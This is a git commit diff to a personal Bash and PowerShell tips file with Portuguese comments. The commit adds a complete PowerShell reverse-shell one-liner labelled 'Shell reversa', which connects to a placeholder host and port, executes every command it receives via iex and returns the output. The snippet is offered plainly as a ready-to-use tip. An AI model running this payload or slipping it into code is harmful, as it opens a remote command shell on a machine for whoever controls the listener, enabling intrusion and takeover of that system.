8ff9d26a9ecfadc658d3719b23bdc11e6fefaa1a
Corvo <50427765+rf-peixoto@users.noreply.github.com>
2022-11-05 11:21:00 -0300

    Update generic_tips.sh

--- Code/Bash/generic_tips.sh
+++ Code/Bash/generic_tips.sh
@@ -225,3 +225,6 @@ touch -r source.file new.file
 
 # Listar servidores não-Windows conectados ao AD nos últimos N dias:
 Get-ADComputer -Filter { OperatingSystem -notlike "Windows Server*" } -Properties PasswordLastSet | ? { (((Get-Date) – $_.PasswordLastSet).Days) -gt 30} | Select Name,>
+
+# Shell reversa:
+$client = New-Object System.Net.Sockets.TCPClient('127.0.0.1',8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
